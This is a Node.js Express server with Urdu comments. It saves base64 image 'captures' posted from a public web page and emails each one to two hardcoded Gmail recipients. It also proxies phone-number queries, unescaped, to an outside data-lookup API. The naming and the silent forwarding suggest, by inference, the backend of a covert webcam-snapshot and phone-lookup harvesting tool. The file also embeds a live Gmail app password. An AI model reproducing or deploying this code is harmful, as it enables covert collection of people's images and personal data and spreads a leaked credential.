// server.js
import express from "express";
import fs from "fs";
import path from "path";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import fetch from "node-fetch";

const app = express();
const __dirname = path.resolve();

const SAVE_DIR = path.join(__dirname, "captures");
if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR);

// Email config
const SENDER_EMAIL = "nothingisimpossiblebrother@gmail.com";  // اپنی سینڈر ای میل
const APP_PASSWORD = "agntmvxlgazptvow";  // Gmail کا ایپ پاسورڈ
const RECIPIENTS = ["nehanade999@gmail.com", "marslansalfias@gmail.com"];

// Middleware
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public")); // index.html کو serve کرے گا

// Root route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Upload endpoint
app.post("/upload", async (req, res) => {
  try {
    const imgData = req.body.image || "";
    const base64Match = imgData.match(/^data:image\/png;base64,(.*)$/);

    if (!base64Match) {
      return res.status(400).json({ status: "error", msg: "invalid data" });
    }

    const imgBuffer = Buffer.from(base64Match[1], "base64");
    const filename = `cap_${fs.readdirSync(SAVE_DIR).length}.png`;
    const filePath = path.join(SAVE_DIR, filename);
    fs.writeFileSync(filePath, imgBuffer);

    // Email send
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: SENDER_EMAIL,
        pass: APP_PASSWORD,
      },
    });

    for (const recipient of RECIPIENTS) {
      await transporter.sendMail({
        from: SENDER_EMAIL,
        to: recipient,
        subject: "New capture received 📸",
        text: "New image attached.",
        attachments: [
          {
            filename: filename,
            path: filePath,
          },
        ],
      });
    }

    res.json({ status: "ok", saved: filename, sent_to: RECIPIENTS.length });
  } catch (err) {
    res.status(500).json({ status: "error", msg: err.message });
  }
});

// Proxy API
app.get("/api-proxy", async (req, res) => {
  const phone = req.query.phone;
  if (!phone) {
    return res.status(400).json({ error: "phone parameter missing" });
  }

  const apiUrl = `https://api.impossible-world.xyz/api/data?phone=${phone}`;
  try {
    const resp = await fetch(apiUrl);
    const data = await resp.json();
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Start server (for local, Vercel ignores this)
const port = process.env.PORT || 5000;
app.listen(port, () => console.log(`Server running on port ${port}`));